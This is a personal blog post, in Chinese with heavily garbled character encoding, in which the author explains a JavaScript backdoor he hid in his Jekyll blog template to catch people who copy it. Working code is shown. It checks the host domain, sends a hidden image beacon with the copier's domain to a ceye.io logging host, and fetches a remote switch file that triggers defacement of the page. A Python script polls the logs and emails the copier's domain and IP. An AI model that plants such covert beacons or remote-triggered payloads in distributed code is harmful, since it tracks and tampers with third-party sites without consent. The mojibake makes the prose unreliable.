I"øS<h1 id="å‰è¨€">å‰è¨€</h1>

<p>åœ¨å‰æ®µæ—¶é—´ï¼Œæˆ‘åœ¨æˆ‘åšå®¢çš„æ¨¡æ¿ä¸ŠåŠ å…¥äº†åé—¨ï¼ˆJavaScriptï¼‰ï¼Œä»Šå¤©å»é™¤ï¼Œå¹¶å°†æ€è·¯ç®€å•çš„å†™å‡ºæ¥ã€‚</p>

<h2 id="ä¸ºä»€ä¹ˆç•™åé—¨å‘¢">ä¸ºä»€ä¹ˆç•™åé—¨å‘¢ï¼Ÿ</h2>

<p><strong>èµ·å› </strong>ï¼šåœ¨å‰ä¸ä¹…ï¼Œå›¢é˜Ÿå®˜ç½‘æ¨¡æ¿å°±è¢«å·èµ°ï¼Œå¾ˆè®©äººç”Ÿæ°”ï¼ŒæŠ„è¢­è€…å›¢é˜Ÿï¼ˆä»¥ä¸‹ç®€ç§°ä¸ºï¼šAï¼‰æ²¡æœ‰æ‰“ä¸€å£°æ‹›å‘¼å°±æ‹¿èµ°äº†ï¼Œä½†å¯ç¬‘çš„æ˜¯Aå¹¶æ²¡æœ‰åœ¨æ¨¡æ¿ä¸­ä¿®æ”¹JavaScriptæ–‡ä»¶çš„å¤–é“¾å¼•ç”¨ï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨æˆ‘ä»¬çš„JavaScriptæ–‡ä»¶ï¼Œæ‰€ä»¥ç®€å•çš„åˆ©ç”¨JSä¿®æ”¹äº†ä¸€ä¸‹å…¶ä¸»é¡µï¼Œæé†’äº†ä¸‹ä»–ï¼Œç»è¿‡åæ¥Aä¸»åŠ¨ä¸æˆ‘è”ç³»å¹¶é“æ­‰ï¼Œè¿™ä»¶äº‹æƒ…æ‰ç»“æŸï½</p>

<p>è®©æˆ‘åƒæƒŠçš„æ˜¯ï¼Œè¿™ä»¶äº‹ä¹‹åæˆ‘å‘ç°æˆ‘åšå®¢ä¸»é¢˜æ¨¡æ¿è¢«æ‹¿èµ°äº†ï¼Œæ˜¯çš„ï¼Œä¸æ­¢ä¸€ä¸ªå“¥ä»¬ã€‚</p>

<p>æˆ‘åœ¨æˆ‘çš„åšå®¢é¡¹ç›®ä¸­è¯´æ˜äº†<code class="language-plaintext highlighter-rouge">https://github.com/gh0stkey/gh0stkey.github.io</code></p>

<blockquote>
  <p>ä¸ªäººåšå®¢ gh0st.cn æ¨¡ç‰ˆæ¥è‡ªï¼šhttps://github.com/heiswayi/the-plain åœ¨åŸåŸºç¡€ä¸Šå¢åŠ äº†åˆ†é¡µã€ç½‘æ˜“äº‘éŸ³ä¹æ’­æ”¾å™¨ç­‰åŠŸèƒ½ï¼ˆåšäº†ä¸€äº›æ’ç‰ˆç»†èŠ‚ä¸Šçš„è°ƒæ•´ï¼‰ï¼Œæ‹¿ä¹‹å‰å‘Šè¯‰æˆ‘ä¸‹ï¼Œè°¢è°¢ï¼</p>
</blockquote>

<p>å› ä¸ºåšå®¢é‡‡ç”¨çš„æ˜¯Github Pages + Jekyllï¼Œæ‰€ä»¥éœ€è¦ä¾èµ–äºGithubçš„è¿›è¡Œæ‰˜ç®¡ï¼Œæ¨¡æ¿ä¹Ÿå°±è‡ªç„¶è€Œç„¶çš„å¯ä»¥ç›´æ¥<code class="language-plaintext highlighter-rouge">git clone</code>ä¸‹æ¥ï¼Œæ¨¡æ¿ä¹Ÿæ˜¯æˆ‘è¿›è¡ŒäºŒæ¬¡ä¿®æ”¹çš„ï¼Œæˆ‘è§‰å¾—èµ·ç è¦å°Šé‡ä¸‹ä½œè€…ï¼Œåœ¨åšå®¢ä¸»é¢˜æˆ–é¡¹ç›®ä¹‹ç±»çš„è¿›è¡Œè¯´æ˜ï¼Œæ‰“å£°æ‹›å‘¼ä¹Ÿè¡Œï¼Œä¸€å£°ä¸å­çš„æ‹¿èµ°æ˜¯å‡ ä¸ªæ„æ€â€¦â€¦</p>

<p>æœ‰ä¸ªå¥½å…„å¼Ÿè¯´è¿‡è¿™æ ·ä¸€æ®µè¯ï¼Œæœ›å‘¨çŸ¥ï¼š</p>

<blockquote>
  <p>å‚è€ƒåˆ«äººçš„ç ”ç©¶æˆæœè‘—åæ¥æºæ˜¯åŸºæœ¬ç´ è´¨ï¼Œæ¯ä¸ªäººéƒ½åº”è¯¥æ„å»ºä¸€ä¸ªå’Œè°ç§¯æå‘ä¸Šçš„æ°›å›´ï¼ŒçŸ¥é“çš„äººä¸æ„¿æ„åˆ†äº«çš„åŸå› å°±æ˜¯ä¸è¢«åˆ«äººè®¤å¯ï¼Œäº’ç›¸è®¤å¯æ‰èƒ½è¿›æ­¥ï¼Œç°åœ¨ç†è§£ä¸€äº›å¸ˆå‚…çš„è‹¦è¡·äº†ï¼ŒæŒºæ‚²å“€çš„ã€‚è¯·å„ä½åœ¨ä»¥åçš„å­¦ä¹ ç”Ÿæ¶¯ä¸Šï¼Œå°Šé‡åˆ«äººçš„åˆ†äº«ï¼Œè®¤å¯ä»–äººï¼Œäº’ç›¸æ„ŸæŸ“æ‰èƒ½è¿›æ­¥ã€‚</p>
</blockquote>

<h1 id="å…³äºåé—¨">å…³äºåé—¨</h1>

<p>æˆ‘æ˜¯ä¸€ä¸ªâ€œé‡åº¦æ´ç™–æ‚£è€…â€ï¼Œä¸å–œæ¬¢è‡ªå·±çš„ä»»ä½•ä¸œè¥¿å¸¦ä¸Šä»»ä½•æ±¡ç‚¹ã€‚åŒ…æ‹¬å¯¹äºåœ¨è‡ªå·±åšå®¢æ¨¡æ¿ä¸­åŠ å…¥åé—¨ï¼Œè¿™å¯¹æˆ‘æ¥è¯´æ˜¯ä¸€ä»¶å¸¦æœ‰â€œå¤§æ±¡ç‚¹â€çš„äº‹æƒ…ï¼Œæ‰€ä»¥æ€è€ƒäº†å¾ˆä¹…å†³å®šåŠ ä¸Šåé—¨ã€‚</p>

<h2 id="åé—¨çš„æ„å»º">åé—¨çš„æ„å»º</h2>

<h3 id="javascript-åé—¨">JavaScript åé—¨</h3>

<p>æ¨¡æ¿åé—¨é€‰æ‹©çš„æ˜¯JavaScriptå¤–é“¾å¼•ç”¨ï¼Œè€ŒJavaScriptçš„å†…å®¹æ„å»ºæ­¥éª¤å¦‚ä¸‹ï¼š</p>

<p><strong>1.åˆ¤æ–­æ˜¯å¦æ˜¯è‡ªå·±çš„åŸŸåï¼ˆè¿™ä¸ªæ­£åˆ™å†™çš„ä¸ä¸¥è°¨æ˜¯å¯ä»¥è¢«ç»•è¿‡çš„ï¼Œä¾‹å¦‚ï¼š<code class="language-plaintext highlighter-rouge">gh0st.cn.bypass.cn</code>ï¼‰ï¼š</strong></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">host</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">host</span><span class="p">;</span> <span class="c1">//è·å–host</span>
<span class="kd">var</span> <span class="nx">reg</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="sr">/gh0st.cn/</span><span class="p">);</span> <span class="c1">//åˆ›å»ºæ­£åˆ™</span>
<span class="kd">var</span> <span class="nx">isok</span> <span class="o">=</span> <span class="nx">reg</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">host</span><span class="p">);</span> <span class="c1">//åŒ¹é…ç»“æœï¼šFalse\True</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isok</span><span class="p">){</span><span class="c1">//åˆ¤æ–­</span>
	<span class="p">...</span><span class="nx">code</span>
<span class="p">}</span>
</code></pre></div></div>

<p><strong>2.è§¦å‘å¼ï¼šåœ¨ä¸€ä¸ªWebæœåŠ¡ä¸Šæ·»åŠ äº†isopen.txtè¿™ä¸ªæ–‡ä»¶ï¼Œå†…å®¹ä¸ºNOåˆ™ä¸è§¦å‘ï¼Œå†…å®¹ä¸ºYESåˆ™è§¦å‘ã€‚ï¼ˆé€‰æ‹©è§¦å‘å¼çš„åŸå› æ˜¯å› ä¸ºåšå®¢ä¸Šçº¿æœ‰æœ¬åœ°è°ƒè¯•è¿™ä¸€ç¯èŠ‚ï¼Œå¦‚æœåœ¨æœ¬åœ°å°±è§¦å‘äº†ï¼Œé‚£å²‚ä¸æ˜¯å¾—ä¸å¿å¤±ï¼Œæ²¡æœ‰é€ æˆä»€ä¹ˆç›´æ¥æŸå®³ï½ï¼‰</strong></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> <span class="c1">//åˆ›å»ºXMLHttpRequest</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span> <span class="c1">//è¯·æ±‚æˆåŠŸåˆ™è§¦å‘</span>
	<span class="k">if</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">YES</span><span class="dl">"</span><span class="p">){</span> <span class="c1">//åˆ¤æ–­è¯·æ±‚ç½‘ç«™çš„å†…å®¹æ˜¯å¦æ˜¯YESï¼Œå¦‚æœæ˜¯åˆ™è¿›è¡Œä¸‹ä¸€æ­¥</span>
		<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;center&gt;&lt;h1&gt;Please tell me before using my template!By:[Vulkey_Chen]&lt;center&gt;&lt;h1&gt;</span><span class="dl">"</span><span class="p">);</span> <span class="c1">//é¡µé¢å†…å®¹ä¿®æ”¹</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http://webserver/isopen.txt</span><span class="dl">"</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span> <span class="c1">//è¯·æ±‚http://webserver/isopen.txt</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
</code></pre></div></div>

<p><strong>3.æ—¢ç„¶é€‰æ‹©äº†è§¦å‘å¼çš„åé—¨ï¼Œé‚£ä¹ˆå°±éœ€è¦çŸ¥é“æ˜¯è°å·äº†æ¨¡æ¿ï¼Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯<code class="language-plaintext highlighter-rouge">ceye.io</code>è¿™ä¸ªå¹³å°å»è®°å½•â€œå°å·â€çš„åŸŸåå’ŒIPä¹‹ç±»çš„ä¸œè¥¿ï¼š</strong></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">img</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">img</span><span class="dl">"</span><span class="p">);</span> <span class="c1">//åˆ›å»ºimgæ ‡ç­¾</span>
<span class="nx">img</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://myblog.ä½ çš„åœ°å€.ceye.io/fuck?domain=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">host</span><span class="p">;</span> <span class="c1">//è®¾ç½®imgæ ‡ç­¾çš„srcå±æ€§</span>
<span class="nx">img</span><span class="p">.</span><span class="nx">stytle</span><span class="p">.</span><span class="nx">display</span><span class="o">=</span><span class="dl">"</span><span class="s2">none</span><span class="dl">"</span><span class="p">;</span> <span class="c1">//è®¾ç½®imgæ ‡ç­¾çš„æ ·å¼çš„displayå±æ€§ä¸ºnoneï¼ˆè¡¨ç¤ºè¿™ä¸ªå°†å›¾ç‰‡éšè—ï¼‰</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">img</span><span class="p">);</span> <span class="c1">//åœ¨DOMèŠ‚ç‚¹(body)å†…åŠ å…¥imgæ ‡ç­¾</span>
</code></pre></div></div>

<p><strong>4.åœ¨åšå®¢æ¨¡æ¿çš„header.htmlä¸­å¼•ç”¨äº†å¤–éƒ¨çš„JSåœ°å€<code class="language-plaintext highlighter-rouge">&lt;script src="http://webserver/xxx.js"&gt;</code></strong></p>

<p>å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">host</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">host</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">reg</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="sr">/gh0st.cn/</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">isok</span> <span class="o">=</span> <span class="nx">reg</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">host</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isok</span><span class="p">){</span>
	<span class="kd">var</span> <span class="nx">img</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">img</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">img</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://myblog.ä½ çš„åœ°å€.ceye.io/fuck?domain=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">host</span><span class="p">;</span>
    <span class="nx">img</span><span class="p">.</span><span class="nx">stytle</span><span class="p">.</span><span class="nx">display</span><span class="o">=</span><span class="dl">"</span><span class="s2">none</span><span class="dl">"</span><span class="p">;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">img</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
    <span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">YES</span><span class="dl">"</span><span class="p">){</span>
        	<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;center&gt;&lt;h1&gt;Please tell me before using my template!By:[Vulkey_Chen]&lt;center&gt;&lt;h1&gt;</span><span class="dl">"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http://webserver/isopen.txt</span><span class="dl">"</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
    <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="python-ç›‘æ§">Python ç›‘æ§</h3>

<p>åˆ©ç”¨<code class="language-plaintext highlighter-rouge">ceye.io</code>è¿™ä¸ªå¹³å°çš„APIå»å®æ—¶ç›‘æ§ï¼Œå¹¶ä¸”ä½¿ç”¨é‚®ä»¶å‘ä¿¡é€šçŸ¥ã€‚</p>

<p>å¯¼å…¥Pythonæ¨¡å— &amp;&amp; å…¨å±€å˜é‡ï¼š</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">smtplib</span><span class="p">,</span><span class="n">requests</span><span class="p">,</span><span class="n">json</span><span class="p">,</span><span class="n">urlparse</span><span class="p">,</span><span class="n">sys</span>
<span class="kn">from</span> <span class="nn">email.MIMEText</span> <span class="kn">import</span> <span class="n">MIMEText</span>
<span class="kn">from</span> <span class="nn">email.Utils</span> <span class="kn">import</span> <span class="n">formatdate</span>
<span class="kn">from</span> <span class="nn">email.Header</span> <span class="kn">import</span> <span class="n">Header</span>

<span class="n">log</span> <span class="o">=</span> <span class="p">{}</span>
</code></pre></div></div>

<p><strong>1.163é‚®ä»¶å‘ä¿¡ï¼š</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send_mail</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span><span class="n">ip</span><span class="p">):</span>
	<span class="n">smtpHost</span> <span class="o">=</span> <span class="s">'smtp.163.com'</span>
	<span class="n">smtpPort</span> <span class="o">=</span> <span class="s">'25'</span>
	<span class="n">fromMail</span> <span class="o">=</span> <span class="s">'é‚®ç®±è´¦æˆ·'</span>
	<span class="n">toMail</span> <span class="o">=</span> <span class="s">'é‚®ç®±è´¦æˆ·,æ”¶ä¿¡æ–¹'</span>
	<span class="n">username</span> <span class="o">=</span> <span class="s">'é‚®ç®±è´¦æˆ·'</span>
	<span class="n">password</span> <span class="o">=</span> <span class="s">'é‚®ç®±å¯†ç '</span>
	<span class="nb">reload</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
	<span class="n">sys</span><span class="p">.</span><span class="n">setdefaultencoding</span><span class="p">(</span><span class="s">'utf8'</span><span class="p">)</span>

	<span class="n">subject</span> <span class="o">=</span> <span class="s">u'åšå®¢ç›‘æ§åˆ°æœ‰äººå·æ¨¡æ¿ï¼'</span>
	<span class="n">body</span> <span class="o">=</span> <span class="s">u"[å°å·ä¿¡æ¯]</span><span class="se">\n</span><span class="s">Domain: {0} IP: {1}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span><span class="n">ip</span><span class="p">)</span>

	<span class="n">encoding</span> <span class="o">=</span> <span class="s">'utf-8'</span>
	<span class="n">mail</span> <span class="o">=</span> <span class="n">MIMEText</span><span class="p">(</span><span class="n">body</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">encoding</span><span class="p">),</span><span class="s">'plain'</span><span class="p">,</span><span class="n">encoding</span><span class="p">)</span>
	<span class="n">mail</span><span class="p">[</span><span class="s">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="n">Header</span><span class="p">(</span><span class="n">subject</span><span class="p">,</span><span class="n">encoding</span><span class="p">)</span>
	<span class="n">mail</span><span class="p">[</span><span class="s">'From'</span><span class="p">]</span> <span class="o">=</span> <span class="n">fromMail</span>
	<span class="n">mail</span><span class="p">[</span><span class="s">'To'</span><span class="p">]</span> <span class="o">=</span> <span class="n">toMail</span>
	<span class="n">mail</span><span class="p">[</span><span class="s">'Date'</span><span class="p">]</span> <span class="o">=</span> <span class="n">formatdate</span><span class="p">()</span>

	<span class="k">try</span><span class="p">:</span>
		<span class="n">smtp</span> <span class="o">=</span> <span class="n">smtplib</span><span class="p">.</span><span class="n">SMTP</span><span class="p">(</span><span class="n">smtpHost</span><span class="p">,</span><span class="n">smtpPort</span><span class="p">)</span>
		<span class="n">smtp</span><span class="p">.</span><span class="n">ehlo</span><span class="p">()</span>
		<span class="n">smtp</span><span class="p">.</span><span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span>
		<span class="n">smtp</span><span class="p">.</span><span class="n">sendmail</span><span class="p">(</span><span class="n">fromMail</span><span class="p">,</span><span class="n">toMail</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">),</span><span class="n">mail</span><span class="p">.</span><span class="n">as_string</span><span class="p">())</span>
		<span class="k">print</span> <span class="s">u"é‚®ä»¶å·²å‘é€ï¼Œç›‘æ§ä¿¡æ¯ï¼š"</span>
		<span class="k">print</span> <span class="n">body</span>
	<span class="k">except</span> <span class="nb">Exception</span><span class="p">,</span><span class="n">e</span><span class="p">:</span>
		<span class="k">print</span> <span class="n">e</span>
		<span class="k">print</span> <span class="s">u"å‘é€å¤±è´¥ï¼Œç›‘æ§ä¿¡æ¯ï¼š"</span>
		<span class="k">print</span> <span class="n">body</span>
	<span class="k">finally</span><span class="p">:</span>
		<span class="n">smtp</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p><strong>2.ceye.io APIè°ƒç”¨è·å–ä¿¡æ¯ï¼Œ<a href="http://ceye.io/profile">ä¸ªäººä¸­å¿ƒ</a>å¯ä»¥çœ‹è§API TOKENï¼Œ<a href="http://ceye.io/api">APIä½¿ç”¨æ–¹æ³•</a>ï¼š</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">dnslog_monitor</span><span class="p">():</span>
	<span class="n">api</span> <span class="o">=</span> <span class="s">"http://api.ceye.io/v1/records?token=ä½ çš„TOKEN&amp;type=http&amp;filter=myblog"</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">api</span><span class="p">)</span>
	<span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">json_data</span><span class="p">[</span><span class="s">'data'</span><span class="p">]:</span>
		<span class="n">query</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="s">'name'</span><span class="p">]).</span><span class="n">query</span>
		<span class="n">sb_domain</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">([(</span><span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">urlparse</span><span class="p">.</span><span class="n">parse_qs</span><span class="p">(</span><span class="n">query</span><span class="p">).</span><span class="n">items</span><span class="p">()])[</span><span class="s">'domain'</span><span class="p">]</span>
		<span class="n">sb_ip</span> <span class="o">=</span> <span class="n">i</span><span class="p">[</span><span class="s">'remote_addr'</span><span class="p">]</span>
		<span class="k">if</span> <span class="n">sb_domain</span> <span class="ow">in</span> <span class="n">log</span><span class="p">:</span>
			<span class="k">pass</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="n">log</span><span class="p">[</span><span class="n">sb_domain</span><span class="p">]</span> <span class="o">=</span> <span class="n">sb_ip</span>
			<span class="n">send_mail</span><span class="p">(</span><span class="n">sb_domain</span><span class="p">,</span><span class="n">sb_ip</span><span class="p">)</span>
</code></pre></div></div>

<p><strong>3.mainå‡½æ•°ï¼š</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
		<span class="n">dnslog_monitor</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="åé—¨çš„è¿è¡Œ">åé—¨çš„è¿è¡Œ</h2>

<p>pythonè„šæœ¬æŒ‚åœ¨æœåŠ¡å™¨è·‘äº†ä¸€æ®µæ—¶é—´ï¼Œä¹Ÿå‘ç°äº†ä¸€ä¸ªå“¥ä»¬åˆæ‹¿èµ°äº†æˆ‘çš„åšå®¢æ¨¡æ¿ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2019-01-23/0.png" alt="oh,no" /></p>

<p>è®©ä»–â€ç”¨â€äº†ä¸€æ®µæ—¶é—´ï¼Œä¾¿å°†isopen.txtçš„å†…å®¹æ”¹ä¸ºäº†YESï¼ˆå³è§¦å‘äº†åé—¨ï¼‰ï¼Œå…¶åæ¥ä¹Ÿä¸æˆ‘è”ç³»ï¼Œå¹¶è¿›è¡Œäº†å’Œè§£ã€‚</p>

<h1 id="å†™åœ¨æœ€åçš„è¯">å†™åœ¨æœ€åçš„è¯</h1>

<p>ä¹Ÿæ˜¯å› ä¸ºâ€œé‡åº¦æ´ç™–â€ï¼Œå†³å®šå°†æ¨¡æ¿åé—¨å»é™¤ã€‚æœ›å›å°Šé‡æŠ€æœ¯ã€åˆ†äº«ã€ä½œè€…ï¼Œå…±å‹‰ï¼</p>
:ET